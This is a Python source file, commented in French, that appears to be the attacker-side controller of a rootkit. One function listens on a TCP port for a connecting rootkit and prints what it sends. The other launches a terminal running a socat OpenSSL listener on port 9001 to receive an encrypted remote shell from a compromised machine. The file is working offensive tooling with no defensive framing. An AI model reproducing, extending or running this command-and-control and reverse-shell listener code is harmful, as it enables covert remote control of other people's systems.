import shutil
import subprocess
import socket
import threading

from config import HOST, PORT
from communication import receive_from_server
from utils.tools import connection_lock, rootkit_connection, rootkit_address


def socket_listener():
    """
    Écoute les connexions entrantes depuis le rootkit sur le port TCP.
    """
    global rootkit_connection, rootkit_address

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"📡 [*] Serveur à l'écoute sur {HOST}:{PORT}...")

    connection, address = server_socket.accept()
    with connection_lock:
        rootkit_connection = connection
        rootkit_address = address

    print(f"✅ [+] Rootkit connecté depuis {address[0]}")

    data = receive_from_server(connection)
    print(f"📥 [rootkit] {data}")


def run_socat_shell(port=9001):
    """
    Lance un terminal socat sécurisé sur un port donné.
    """
    terminal_cmd = None

    if shutil.which("gnome-terminal"):
        terminal_cmd = [
            "gnome-terminal",
            "--",
            "bash",
            "-c",
            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    elif shutil.which("xterm"):
        terminal_cmd = [
            "xterm",
            "-e",
            f"bash -c 'socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
        ]
    elif shutil.which("konsole"):
        terminal_cmd = [
            "konsole",
            "-e",
            "bash",
            "-c",
            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    else:
        print("❌ Aucun terminal compatible trouvé.")
        return

    try:
        subprocess.Popen(terminal_cmd)
        print(f"🚀 Terminal distant lancé sur le port {port}.")
    except Exception as e:
        print(f"💥 Erreur socat : {e}")
